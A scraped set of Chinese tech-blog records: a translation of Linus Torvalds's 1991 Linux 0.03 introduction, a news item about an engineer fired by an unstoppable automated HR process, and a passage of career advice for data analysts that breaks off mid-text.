{"title": "Linus 定义 Linux", "createdate": "2018/07/09", "url": "http://blog.jobbole.com/114208/", "url_object_id": "d6ec0ef3593f6a22382ac914afc4a27a", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/03/5215e39e39eb546d1689aa26f8d633be.jpg"], "thumbs": 1, "bookmark": 1, "comments": 2, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://oldlinux.org/Linus/\">Linus Torvalds</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/linux-a-free-unix-386-kernel\">开源中国</a>   </div><h1>LINUX介绍</h1>\n<h2>LINUX是什么？</h2>\n<p>LINUX是一个免费类unix内核，适用于386-AT计算机，附带完整源代码。主要让黑客、计算机科学学生使用，学习和享受。它大部分用C编写，但是一小部分是用gnu格式汇编，而且引导序列用的是因特尔086汇编语言。C代码是相对ANSI的，使用一些GNU增强特性（大多为 __asm__ 和 inline）。</p>\n<p>然而有很多可用于386电脑的unices，他们大部分要花很多钱，而且不附带源码。因此他们是使用计算机的理想选择，但是如果你想了解他们如何工作，那是不可能的。</p>\n<p>也有一些  Unix 是附带源码的。Minix，Andrew S. Tanenbaum编写的学习工具，已经在大学中作为教学工具使用了很多年了。BSD-386系统是附带源码的，但是有版权限制，而且要花很多钱（我记得起始价格为$995）。GNU内核（Hurd）将会是免费的，但是现在还没有准备好，而且对于了解和学习它们来说有点庞大。</p>\n<p>LINUX与Minix是最相似的，由于它很小而且不是非常复杂，因此易于理解（嗯…）。LINUX是基于Minix编写的，因此有相当多的相同点，任何Minix黑客在使用LINUX的时候都感觉非常熟悉。不过，没有在项目中使用Minix代码，因此Minix版权没有限制到这个新系统。它也是完全免费的，而且它的版权非常宽松。因此不像使用Minix，它不需要几兆字节大小的区别。</p>\n<h2>LINUX版权</h2>\n<p>虽然是免费的发布版，我还是从以下几个方面限制了LINUX的使用：</p>\n<ul>\n<li>你可以自由复制和重新发布源码和二进制，只要是：</li>\n</ul>\n<ol>\n<li>完全开源。因此不能单独发布二进制，即使你只修改了一点。</li>\n<li>你不能从发布版获取利益。事实上甚至“装卸费用”都是不被接受的。</li>\n<li>你要保持完整的适当版权。</li>\n</ol>\n<ul>\n<li>根据需要你可能会修改源码，但是如果你发布了新系统的一部分（或者只有二进制），必须将新的代码包含进去。</li>\n<li>除了不包含版权的代码之外，你可能会做一些小的修改。这由你来定，但是如果能将相关内容或者代码告诉我，将不胜感激。</li>\n</ul>\n<p>对任何使用或者扩展系统的人来说，这应该足够宽松而不会引起任何担忧。如果你有朋友真的不想要源码，只想要一个能运行的二进制，你当然可以给他而不用担心我会起诉你。不过最好只在朋友之间这么做。</p>\n<h2>LINUX运行所需的硬件/软件</h2>\n<p>LINUX是在一个运行Minix的386-AT上开发的。由于LINUX是一个真正的操作系统，而且需要直接与硬件交互来做一些事情，你必须有一个非常相似的系统来让他顺利运行：</p>\n<ul>\n<li>386-AT（PS/2之类是不同的，不能正常运行）</li>\n<li>VGA或者EGA屏幕硬件。</li>\n<li>标准AT硬盘接口，IDE盘可以运行（实际上我用的就是这个）。</li>\n<li>正常实模式BIOS。一些机器看起来是用虚-86模式运行启动程序，而且在这样的机器LINUX不会启动和正常运行。</li>\n</ul>\n<p>LINUX会发展成为一个自给自足的系统，现在需要Minix-386才能正常运行。你需要Minix让初始化启动文件系统，和编译OS二进制。在那之后LINUX是一个自给自足的系统，但是为了做文件系统检查（fsck）和修改之后重编译系统，推荐使用Minix。</p>\n<h2>获取LINUX</h2>\n<p>LINUX现在可以使用匿名ftp从‘nic.funet.fi’的‘/pub/OS/Linux’目录获取。这个目录包含操作系统的所有源码，还有一些二进制文件，因此你可以真正使用系统了。</p>\n<p><strong>注意！二进制大多是GNU软件，而且版权比LINUX的严格（GNU非盈利性版权）。因此你不能在不发布他们源码的情况下重新发布他们，可以在/pub/GNU中找到。关于GNU非盈利性版权，从任何GNU软件包了解更多。</strong></p>\n<p>此目录中各类文件如下：</p>\n<ul>\n<li>linux-0.03.tar.Z–系统的完全源码，16位tar压缩文件格式。</li>\n<li>Linux.tex–这个文件的LATEX源码。</li>\n<li>bash.Z–在LINUX下运行的bash二进制文件。这个二进制文件应该放到预留给LINUX文件系统中的/bin/sh下（参见installation）。</li>\n<li>update.Z–更新二进制文件，要放到/bin/update。</li>\n<li>gccbin.tar.Z–GNU cc二进制文件需要由一个可运行的编译器。这个tar压缩包含有编译器，加载器，汇编程序和支持程序（nm，strip等）。它还包含一个小型的库，可用于大部分程序。</li>\n<li>include.tar.Z–让gcc运行的必要include文件。</li>\n<li>unistd.tar.Z–unistd库程序的源码（即系统调用接口）。通过这个你可以使用系统独立库源码编译一个大一些的库。</li>\n<li>utilbin.tar.Z–各种GNU工具的二进制文件，包括GNU的fileutils，make和tar。也包含克隆emacs的uemacs。</li>\n<li>README, RELNOTES-0.01, INSTALLATION–包含一些（有点过时的）LINUX相关的信息的ascii文件。</li>\n</ul>\n<p>让系统运行的最少文件是OS源码和bash和更新二进制文件。不过只用这些，你做不了什么事。</p>\n<h2>安装</h2>\n<p>在你拿到了必要LINUX文件之后，你需要编译系统和创建root目录。必要的二进制文件需要放到root文件系统中。按如下操作：<br>\n1. 备份你的软件。虽然LINUX从没有毁坏过我的任何文件，但没有什么是必然的。安全胜过遗憾。<br>\n2. 选择/创建一个标准MinixHD-分区作为新的LINUX root文件系统。<br>\n3. 在新的root创建必要的设备节点。LINUX与Minix使用相同类型的节点，所以使用Minix的mknod命令创建下面的设备：节点号与在Minix中相同。</p>\n<ul>\n<li>/dev/tty</li>\n<li>/dev/tty[0-2]</li>\n<li>/dev/hd[0-9]</li>\n</ul>\n<p>4. 将必要文件放到新的root分区。文件应该放在下面目录中：<br>\n希望你现在有一个功能正常的unix，而且你已经root权限登录。LINUX现在没有‘init’过程，只要你注销，系统会同步并等待。使用三指键（Ctrl+Alt+Del）重启机器。</p>\n<ul>\n<li>gcc</li>\n<li>添加链接到你选择的/usr/local/lib中的文件。我将ld，as，nm，strip和size链接到他们相应的 /usr/local/lib/gcc-XXX。</li>\n<li>gccbin.tar.Z中的内容，除了gcc</li>\n<li>include.tar.Z的内容</li>\n<li>utilbin.tar.Z的内容</li>\n<li>sh，即bash.Z</li>\n<li>update</li>\n<li>/bin:</li>\n<li>/usr/bin:</li>\n<li>/usr/include:</li>\n<li>/usr/local/lib:</li>\n<li>/usr/local/bin:</li>\n<li>编辑系统中的linux/include/linux/config.h。这个文件包含了针对于系统的信息：内存空间，硬盘类型，root分区号（同样的与Minix中的编号相同），键盘类型（现在只有US和Finnish）等。</li>\n<li>编译LINUX源码。一个简单技巧就可以完成，在你编辑makefiles为适合你的系统之后（即，删除-mstring-insnsflag，和修改适合你的路径。）1.40之前版本gcc的用户可能需要添加gnulib到makefile中‘LIBS=’一行。</li>\n<li>复制产生的镜像文件到软盘（即，cp Image /dev/PS0 或者之类的）。</li>\n<li>使用新的软盘重启。启动界面应该告诉你系统正在启动（加载系统…），然后是一些必要的文件系统信息（xxx/XXX inodes/blocks free），接下来是一个确定，还有bash提示（如果你没有.bashrc文件，则初始化bash#）。</li>\n</ul>\n<p><strong>LINUX 缺失/不兼容的东西</strong></p>\n<p>LINUX 是打算作为一个全部自给自足的内核，但现在并非如此。作为上面已经提到的，你需要 Minix 来设置启动设备并且检查文件系统当它运行起来的时候。这里有一些其它的不足之处：</p>\n<p>硬件的不兼容。一些 AT 标准特性当前还没有支持。最值得注意的是软盘驱动，利用 LINUX 进行实际工作（备份 etc）当前是不可能的[译者：这个是 oldlinux，这个是 Linus Torvalds 1991 年 10 月写的文章，肯定当时是不行的]。还有串行连接的一些特性没有被实现（2400 bps 波特率的硬连接，没有挂断（hang-up）提示等等 ）。</p>\n<p>标准 c 库的不兼容。gcc 分发版的 libc.a 没有完成，我对免费可发布的库功能很感兴趣。</p>\n<p>一些系统调用没有完全实现。这些设计绝大多数“极少调用”的特性比如调试（谁无论如何需要它的话，你的程序第一次是无法工作的:-)）以及其它的特性。</p>\n<p>如上所述，没有登陆和初始化进程。当前 LINUX 启动在单用户模式，以 root 作为控制台用户。对于一些移植工作足够了，但不是实际可用的。</p>\n<p>387支持[译者：硬件浮点，当时 Intel 发布了外接式 FPU] 没有被实现，即使已有一些基础程序被提供出来。”nic.funet.fi” 的 gcc 二进制包使用软浮点（ie 仿真功能调用）来支持 4 个基础数学运算操作。387-支持将尽快实现当我的电脑安装了这个硬件。希望在一个月或者两个月。</p>\n<p>现在还没有重要的系统管理命令实现在 LINUX 中。这些包括 mkfs, format, fsck, mknod 等。这些命令需要的内核特性还没有实现（format, mknod），一些命令只需要实现它。作为一个库，我欢迎任何免费分发文件。</p>\n<p>如您所见，LINUX还不是一个完整的系统。 感谢您的帮助，使其变得更好。 我对为LINUX重写的Minix命令不感兴趣，除非你自己从头开始编写它们。 您当然可以免费（并鼓励）将您的Minix发行版中的所有内容用于您自己的LINUX系统，但由于Minix的版权，它们无法分发给更广泛的受众。</p>\n<p>这里提到的一些问题将由我（即lines/387/floppy支持）尽快修复，但我希望得到库函数的支持。感谢你们提交的错误报告及补丁还有愿望清单，如果你真的有针对问题的补丁，我会立即尝试去修复它。 小的更改将作为补丁形式发送到邮件列表，并在<code>nic.funet.fi'上设置，如果经过大量重写，或者修复大的补丁，整个系统将在</code>nic.funet.fi’更新。</p>\n<h2>LINUX移植软件</h2>\n<p>LINUX被设计得让移植相对容易。因此，就有了完整的termios实现和一些POSIX库。我所移植的（诚然相对较少）程序没有任何问题。</p>\n<p>尽管LINUX与Minix非常相似，但Minix程序通常并不会比为其他nuix设计的程序更容易移植。因此，我不建议从一个特定程序的Minix版本开始，而应该尝试从头开始移植‘’virgin‘’程序。比BSD更接近SYSV，这意味着当给定一个-DUSG或者-DSYSV标识时，大多数程序很容易移植。</p>\n<p>移植过程中最困难的一点就是缺少库函数。这些必须由你来编写，或者从其他的来源复制（Minix可能是个有缘人）。另外，一些程序（特别是GNU）有各种各样的标识，这些标识可以定义哪些函数不可用（一旦在Makefile中添加了足够量的-DXXX_MISSING标识，GNU fileutils将编译的很好）。</p>\n<h2>已经移植的程序</h2>\n<p>下面这些程序已经移植到LINUX：</p>\n<ul>\n<li>GNU cc (gcc, cc1, cpp)</li>\n<li>GNU assembler (as386)</li>\n<li>GNU binutils (ld, ar, nm, size, strip, ranlib)</li>\n<li>GNU compress (16-bit)</li>\n<li>GNU tar</li>\n<li>GNU make</li>\n<li>GNU bash (Bourne Again SHell)</li>\n<li>GNU sed</li>\n<li>GNU bison (yacc-lookalike)</li>\n<li>GNU awk</li>\n<li>GNU fileutils (ls, cp, rm, mkdir, rmdir, tail etc)</li>\n<li>less</li>\n<li>uemacs</li>\n</ul>\n<p>所有上述程序都能在‘nic.funet.fi’(主要在’/pub/gnu’)中找到，大多数LIINUX-binaries都可以在‘/pub/OS/Linux’目录中找到。包括gcc（cc1）有一些我自己增强的功能，所有这些程序都在没有变化的情况下编译的。先尝试自己编译，遇到问题可以将差异或者资源发邮件给我。</p>\n<p>另外，我提起过明确地GNU差异编译和运行。</p>\n<h2>技术帮助</h2>\n<p>LINUX目前有一个邮件列表，您可以通过邮件发送到这个地址订阅：<a href=\"mailto:Linux-activists-request@niksula.hut.fi\" rel=\"nofollow\"><strong>Linux-activists-request@niksula.hut.fi</strong></a> ，并要求包括在列表中。然后你可以通过这个邮箱：<a href=\"mailto:Linux-activists@niksula.hut.fi\" rel=\"nofollow\"><strong>Linux-activists@niksula.hut.fi</strong></a> 提问题，这将复制你的问题/答案/无论什么，并发送给列表中其他所有人。</p>\n<p>请注意Linux-activists和Linux0activists-request的不同——第一个用于给列表中的所有人发送邮件，第二个仅用于订阅和取消订阅。</p>\n<p>当然，您也可以直接发送邮件至 <a href=\"mailto:torvalds@kruuna.helsinki.fi\" rel=\"nofollow\"><strong>torvalds@kruuna.helsinki.fi</strong></a>。我会尽量在一两天内回答所有的问题。</p>\n<p>尽管‘nic.funet.fi’可能会保持合理的更新状态，但是它还有些问题（即，我无法因为个人得到文件，但可以通过几个人）。因此，如果邮件列表上的人想要补丁或二进制文件，他们将会更快得到。</p>\n<h2>感谢</h2>\n<p>我要感谢学院…</p>\n<p>说真的，如果没有其他人的帮助，这个系统将永远不会有曙光，甚至会变得更糟。Bruce Evans 帮助我找到了需要更改的位置，以便gcc能正确地处理浮点数，并提供许多有用的想法/建议（他的Minix-386用于构建系统）。此外，Earl Chew 的estdio包被用于标准的IO库。像这样更自由地分发包！</p>\n<p>Alain W Black和Richard Tobin为Minix制作了gcc，没有它我就无法编译这个东西。GNU完成了我在Linux下使用的大部分程序。Alfred Leung发送了美国键盘补丁。</p>\n<p>附：“感谢”<a href=\"mailto:wirzeniu@kruuna.helsinki.fi\" rel=\"nofollow\">wirzeniu@kruuna.helsinki.fi</a>他的“建设性”批评和“诙谐”的评论。他是我第一个<img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/412f23f15ba46a043bbcb30c697e34f7.png\" alt=\"$alpha$\" width=\"14\" height=\"14\">-测试者，他应该被授予勇气奖章。</p>\n<p><strong>Linus Torvalds </strong>(<strong>torvalds@kruuna.helsinki.fi</strong>)<strong>  1991</strong>年<strong>10</strong>月<strong>10</strong>日</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114208\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114208votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114208\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,Linux", "author": "Linus Torvalds", "front_image_path": "full/e0ca2411e7d10c43fe25ebc0a22960c9b956bd19.jpg"}
{"title": "工作 8 个月后，一名工程师竟然被机器解雇了", "createdate": "2018/06/25", "url": "http://blog.jobbole.com/114154/", "url_object_id": "2967d3141d2e16cd5b82bc162f3a4648", "front_image_url": ["http://wx1.sinaimg.cn/mw690/63918611gy1fsnj3dqw5ij20hj0cpn3g.jpg"], "thumbs": 1, "bookmark": null, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.oschina.net/news/97362/when-a-machine-fired-me\">达尔文</a>   </div><p>Ibrahim Diallo 发表了一篇博客，描述了自己认真地工作却被“强大”的机器系统强制解雇的真实经历，并表示，事情发生的从始至终都没有人能够阻止它。</p>\n<p>Diallo 在文中描述，自己在某天上班时，发现门卡失效，当他找到主管时，又意外发现了自己已经被解雇的邮件，却不知道是谁发的：</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fsnj3dqw5ij20hj0cpn3g.jpg\"></p>\n<p>Diallo 随后来到工作岗位，发现自己的 Jira（项目与事务跟踪工具）账号被禁用，当他找经理重新启用账号时，系统却不允许经理进行重新启用的操作。Diallo 回到办公桌前，发现系统提示他重启电脑，但他知道重启后会导致数据丢失，因此并未进行此操作，可 Windows 电脑最后却自动重启了，导致几十万条记录丢失，Web 界面也不响应了。</p>\n<p>随后 Diallo 用他 CentOS 的机器黑进他的服务器去重启，调试，重启所有访问，然后重新处理所有数据。</p>\n<p>后来问题终于得到解决，谈到整件事情的起因时，Diallo 解释道：</p>\n<blockquote><p>我的合同期限是三年，而我仅工作了八个月。原来在我被解雇之前，公司被一家更大的公司收购，而我正是在收购的过程中加入的。当时由于经理的疏忽，没有给我的合同续约，导致合同中止。</p>\n<p>而按照我们的系统设定，一旦员工合同中止的工作单发出后，系统就会接管一切。所有中止合同所需的工作单会自动发出，每个都会触发其他的工作单。于是就有了我的门卡失效，Windows 账号和 Jira 账号被禁用事情的发生，等等。</p>\n<p><strong>而这整个过程持续了好几天，期间却没有任何方法能人为中止。</strong>我只能以新员工的方式被重新雇佣，意味着我得重新填写各种文件，设置银行卡账号，等联邦快递给我发送新的门卡。</p></blockquote>\n<p>作者在文中将整个过程称为：<strong>一个简单的自动化错误/功能导致的雪崩。</strong>自动化也许给我们的生活和办公带来许多便利，但当机器犯错误时，人必须能够干预。如若不能，可能就会出现上面作者描述的情况，甚至会导致更加严重的问题。想详细了解事件发生的读者可以查看作者的<a href=\"https://idiallo.com/blog/when-a-machine-fired-me\">博客原文</a>。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114154\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114154votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114154\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "业界,自动化", "author": "达尔文", "front_image_path": "full/0c1c6b58f1668b69972b13ab523e285e3514bf2c.jpg"}
{"title": "听说你立志要做数据分析，不如先听听老司机的建议？", "createdate": "2018/06/25", "url": "http://blog.jobbole.com/114150/", "url_object_id": "52d5249e6e503caa3d53418ba9db1163", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/03b5b99cd8b93d7c062277c5de23570b.jpg"], "thumbs": 4, "bookmark": 5, "comments": 1, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://mp.weixin.qq.com/s?__biz=MzU0Mzg4NDI4Mw==&amp;mid=2247483656&amp;idx=1&amp;sn=9ed81ce065f053272f4ac9631c0024ae&amp;chksm=fb05d79ccc725e8a4d9e13aa6a1d3cb49d74149966b1f42c68142b86a76d764c4a91accd908b#rd\">作者 JerryHuang 推荐</a>   </div><p>每年总有很多人，怀揣着对世界的一知半解、满腔似火的热情、还有对美好生活的向往，走出象牙塔，投身社会。</p>\n<p>世界很大，诱惑很多。对于未来，甚至在工作多年后，他们仍然没有清晰的方向，或者缺乏独立、深度的思考。</p>\n<p>方向很重要，而人生很短暂。往哪里走，怎么走，再怎么也得花点时间思考一下，不是吗？</p>\n<p>如果你决心要在数据科学领域有所作为，或者立志做数据分析，这篇文章提了点小建议，希望对你有所帮助。</p>\n<h3>一、去大厂还是去小厂？</h3>\n<p>我们做每件事之前，都要先明确做这件事的目的和意义是什么。</p>\n<p>先来问问自己，做数据分析的目的和价值是什么？我的理解是，致力于用数据帮助企业解决业务问题，辅助业务决策。</p>\n<p>关于这个问题，你可以花3-5年时间来思考和领悟，不急，但需要想清楚。</p>\n<p>你还面临一个抉择，到底是去大厂还是去小厂？</p>\n<p>之前接到很多猎头电话，不少都会问：“你是做分析还是做挖掘的呀？”刚开始，也常会和猎头在电话里“理论”一番。后来在大厂待过才明白，大厂分工比较细，分析是偏向经营分析，即取数分析写报告，而挖掘则是建模调参部署等。小厂就不一样了，谈需求、确定思路、指标设计、平台搭建、接入数据、处理数据、建立宽表、模型训练、结果分析、撰写报告、模型部署、报表计算、数据可视化等一整个流程，一个人几乎都可能会参与。</p>\n<p>如果有机会，请一定要去大厂历练几年！大厂大多都很开放，常常敢为天下先，敢于引入一些新的东西，包括技术、思维、制度，技术比较先进，优秀的人也很多。大厂的管理制度也很完善，福利待遇当然会更好些。大厂的数据规模绝对够大，而且应用场景也多，可施展的空间应该会比较大。所以，抱着学习的态度在大厂里混几年，是可以成长很快的。（有好，当然也有不好）大厂流程繁杂，整体效率偏低，提一个取数申请可能需要1-2周。大厂的内部竞争也大，存在于不同项目团队，也存在于同一部门不同成员之间。大项目资源投入大，小项目资源申请很困难，重视程度也不一样。最主要的，大厂分工很明细，不同职位的轮换似乎不大容易，从入职到几年后离开一直做经营分析都是有可能的，容易导致能力的单一，不利于个人综合素质的培养。</p>\n<p>相比之下，小厂就灵活多了，人和事都不会很复杂，而且效率也高。小厂可能会优先考虑做这件事情的投入和产出，即看应用效果。（大厂反而愿意给资源去试，短期内不怎么关注投入产出。）所以，在小厂工作，既要学会帮公司赚钱，也要学会帮公司省钱。小厂分工不会很细，大多需要一个人做多种工作。所以，小厂里面的程序员常常身怀多技。但小厂数据规模小，技术实力较弱，团队成员整体素质不高，而且项目流程不大规范，常常怎么简单怎么来，怎么高效怎么来。有些小公司的码农，除了对外发过一两封邮件，平时的沟通几乎是在QQ里，结果待了几年之后连写一封邮件都不会。有些小厂自己没有数据，重要是作为乙方给大企业做项目，这种模式常常受甲方牵制，可发挥的空间很小，而且一个项目周期往往比想象中要长（我本人之前就厌倦做乙方），因此不大建议去这样的公司。</p>\n<p>不管大厂还是小厂，在选择时，建议都要看看所要加入的团队。</p>\n<p>综合来说，建议先去大厂混几年，再去小厂找个Title高点的职位发挥自己所长。</p>\n<p>再来说几句，什么场景下分析，什么场景下挖掘呢？</p>\n<p>分析其实是一个很笼统的概念。把当前营业额跟去年同期做对比发现增长了不少，这个也可以认为是分析。分析是从数据中发现问题或规律，并提出合理的建议。分析常常伴随着要写报告，进而要给业务方汇报分析结果。最好是给决策层汇报，因为决策层有拍板的权力，而且对数据结果的感知和可能的应用有自己独到的认知。</p>\n<p>如果需要把分析的结果固化下来，定期输出结果，提供给业务方，这个时候就需要开发数据产品了。</p>\n<p>挖掘是用算法解决某个具体的复杂问题，用常规分析方法解决不了的，如客户流失预警、商品最优推荐组合、最有投递路线规划等。</p>\n<p>所以，我一般认为，分析是从数据中发现问题或规律，而挖掘是其中的一块。</p>\n<p><em><img id=\"pic\" class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fsn7ra4wg5j20tz0gln6j.jpg\"></em></p>\n<p style=\"text-align: center;\"><em>数据技能知识一览</em></p>\n<h3>二、1-3年，“所见即所得”，打磨基础技术</h3>\n<p>在职业生涯的初期，请牢记，“所见即所得，所感即所知，多见即多得，多感即多知”。</p>\n<p>不管在大厂还是在小厂，一定要参与到实际项目当中，好好打磨自己的技术。不管是大项目还是小项目，一定要借助来之不易的机会，以极致的工匠精神修炼自身。</p>\n<p>你最好能从基础数据处理做起。只有这样，你才能早点知道，数据并不像在学校里做实验用到的数据那样“好”，它可能看起来“又脏又乱”。只有这样，你才能早点知道，给你取数的那个程序员是如何花了2-3天甚至一周时间才把数算好。</p>\n<p>如果你精通SQL，那就太好了，这样就可以直接能够在数据平台查看原始的数据了。</p>\n<p>最好要看一看最原始的数据长什么样。你不一定能一下子理解这些数据，但你可以慢慢地感受它们，因为它们所投射出来的是最真实的业务场景。</p>\n<p>举个例子吧，原始的会员注册信息数据里面，性别一般填“男”、“男性”、“女”、“女性”、“未知”、“其它”等值，但处理好之后的二手数据里面，性别就变成了“男”、“女”、“未知”等三个值了。仅看这三个值，可能会漏掉一些业务场景，填“男”可能是从移动端输入时选择的，填“男性”则可能是手工填写注册表格时勾选上的。而漏掉的这个场景，说不定就是所要找的那个分析点。</p>\n<p> </p>\n<p>你最好还能熟练掌握一两门编程语言，比如当下流行的Python，作为入行的基础技能。（顺便说一下，码农界普遍认为只会SQL的不算真正的程序员~~）</p>\n<p>当今时代，编程已经从娃娃开始抓起。早在5年前，英国规定5岁以上儿童必须学习编程课，法国将编程列入初等教育选修课程，美国已有40个州制定政策支持计算机科学，有35个州将计算机科学课程纳入高中毕业学分体系。美国前总统奥巴马就曾在全美发起“编程一小时”的运动，旨在让全美小学生开始学习编程。2017年，浙江、北京、山东等省确定要把Python编程基础纳入信息技术课程和高考的内容体系。编程将是一项很基础的技能，也将是承接其他知识的基石。在未来，会编程很可能跟使用智能手机一样普遍。</p>\n<p>当处理基础数据的时候，必然会在数据库或数据平台上进行。你可能需要对这些存储数据的环境加以了解，如传统的结构化数据库Oracle、Mysql、DB2等，又如当下流行的Nosql数据库HBase、Redis、MongoDB、Cassandra等，再如大数据集群平台、原理及其相关概念，类似Hadoop、Hive、Hue、MapReduce、Spark、Scala、Sqoop、Pig、Zookeeper、Flume、Oozie等。你或者也需要了解数据传输的工具，如DataStage、Kafka、Sqoop等。你甚至也可能被安排做安装系统、部署软件、配置环境、同步数据等一些琐碎的工作。</p>\n<p>关于这些，如果你非常感兴趣，可以考虑往大数据平台方向发展，成为数据开发工程师、数据平台运维工程师、或者数据平台架构师。</p>\n<p>你不必理解太深，可仅仅停留在了解层面，但知道这些知识会让你和数据开发工程师、运维工程师和平台架构师沟通起来顺畅很多。</p>\n<p>当处理和分析数据时，有些关于数据的操作是必然需要掌握的。首先是常见格式的数据导入导出，如TXT、CSV、XLS，然后是主要的数据加工技巧，包括建表/视图、插入、更新、查询、并联、串联、汇总、排序、格式转换、循环、常用的函数、描述统计量、变量，等等。</p>\n<p>这些操作很基础，但不简单。你可能经常会遇到各种情况，如花了一个下午时间就是没能把一个很小的CSV数据文件正确地导入到数据库中，不是乱码就是错位，或者两表关联时老是报一些烦人的错误，或者日期字段进行格式转换时出现空值……反正状况百出，防不胜防。</p>\n<p>关于这些基础操作，需要不断积累经验，尽量能够做到在不同场景下快速高效地完成，轻松应付。</p>\n<p>如果有人已经给你取好了数，而你的工作是分析数据写报告，那么分析技巧首先是你需要培养起来的。对拿到的数据，要时刻保持疑问，不能太乐观，因为别人算好的数据未必完全是你想要的数据，又或者数据质量并不是你想的那样好。</p>\n<p>在分析之前，需要进行数据探索，看看数据质量如何。比如，你需要清楚有多少数据量，有什么信息，可衍生什么指标，缺失情况如何，如何填补缺失值，值的分布情况如何，如何处理极值，名义/字符变量是否需要转换，等等。</p>\n<p>分析时，要清楚指标不同形态的含义，如绝对值、占比、同比、趋势、均值、标准差，等等。</p>\n<p>在这里，我想指出，数据有对比才有意义。如果一个穷人捡到100元，他会很高兴，这够他吃好几天了。但如果让一个富人去捡100元，那感觉就不一样了，他可能觉得他不值得这么做，因为用弯腰去捡的时间挣到的钱远远不止这么多。</p>\n<p>统计学知识是必须要掌握的，这是基础。如果你非数学或统计学专业出身，那么请自学。</p>\n<p>另外，也请你一定要掌握主流算法的原理，比如线性回归、逻辑回归、决策树、神经网络、关联分析、聚类、协同过滤、随机森林，再深入一点，还可以掌握文本分析、深度学习、图像识别等相关的算法。</p>\n<p>关于这些算法，不仅需要了解其原理，你最好可以流畅地阐述出来，还需要你知晓其在各行业的一些应用场景。</p>\n<p>关于这些算法，你最好能够参与关于模型开发的具体项目实践。那样的话，你就可以清楚关于建模的大概流程是怎么样的，不同算法在建模中有不同，需要注意哪些地方。</p>\n<p>如果你打字速度不快，那也最好重视起来，这虽然是一个不痛不痒的问题，但也在较大程度上影响你的工作效率，进而影响到你的工作产出，当然也可能因此会影响到你的薪资哦！</p>\n<p>另外，还有一些提高工作效率的小技巧，也可以多学多掌握。例如，一些电脑的快捷键，定期保存文件，文件的归类存放和快速查找，等等。</p>\n<p>作为职场新人，你不仅需要打磨技术，纯技术之外的技能也需要不断修炼。</p>\n<p>职场的做事方式方法、为人处事以及一些潜规则，更多时候只能靠悟，说出来就可能不大好了，因此需要不断领悟。毕竟，悟性这东西是很重要的。</p>\n<p>还有，沟通是码农普遍的老大难问题，建议重视起来并加强。</p>\n<p>你甚至可以学一下投影仪或打印机怎么用。（说不定可以靠这个技能在老板或同事前面大攒人品哦~~）</p>\n<p>如果你有机会和很牛的人在一起工作，那你太幸运了。你可以多请教优秀的人一些问题，也可以平时多观察那些优秀之人的做事方式、工作习惯，看看有哪些好的地方、好的品质值得你学习。只要吸纳进来，就可以转化为你的优点，推动你进步。</p>\n<p>我毕业的第三年，看到俞敏洪老师在一些演讲中提及他大学时读了800多本书，很受触动，真正认识到了读书的重要性，于是给自己制定了一年读50本书的计划，什么书都读，三年左右时间，我的心智和心态都发生了很大的改变，完全不一样了。</p>\n<p>俗话说：“三人行，必有我师。”每个人都有每个人的优点，对于所遇到的每个人，建议多欣赏别人的优点，少抨击别人的缺点，这样你就可以“兼收并蓄”，逐步